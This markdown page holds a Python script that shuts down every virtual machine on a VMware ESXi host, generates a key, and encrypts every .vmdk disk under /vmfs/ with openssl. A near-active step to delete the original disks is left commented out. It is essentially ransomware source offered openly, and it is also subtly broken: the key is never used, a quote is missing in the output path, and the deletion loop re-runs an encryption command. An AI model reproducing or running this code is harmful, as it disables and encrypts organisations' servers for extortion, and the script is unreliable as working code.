# Encrypt Virtual Machines

## Python

```python
import os

VIRTUAL_MACHINES_LIST = 'vm.txt'

# https://www.youtube.com/watch?v=dB0dOF1ood0
if not os.path.isfile(VIRTUAL_MACHINES_LIST):
    # TODO: The output can be captured with subprocess
    os.system(f"vim-cmd vmsvc/getallvms | awk '$1 ~ /^[0-9]+$/ {print $1}' > {VIRTUAL_MACHINES_LIST}")
    try:
        with open(VIRTUAL_MACHINES_LIST) as z:
            lines = z.readlines()

            for line in lines:
                cmd = ("vim-cmd vmsvc/power.off" + " " + (line))
                os.system(cmd)
    except:
        print("VMs are not powered off")

KEY = 'key.txt'
VMDK_DESTINATIONS = 'vmdk.txt'
# TODO: The output can be captured with subprocess
os.system(f"openssl rand -base64 1024 > {KEY}")
os.system(f"find /vmfs/ | grep .vmdk > {VMDK_DESTINATIONS}")
with open(VMDK_DESTINATIONS) as z:
    lines = z.readlines()

    for line in lines:
        base = os.path.splitext(line)[0]
        cmd = ("openssl enc -aes-256-cbc -md sha256 -salt -in " + '"' + (line.strip()) + '"' + " -out " + '"' + (base) + ".encrypted")
        print(cmd)
        os.system(cmd)

with open(VMDK_DESTINATIONS) as z:
    lines = z.readlines()

    for line in lines:
        base = os.path.splitext(line)[0]
        # cmd = "rm -f " + (line.strip())
        print(cmd)
        os.system(cmd)
```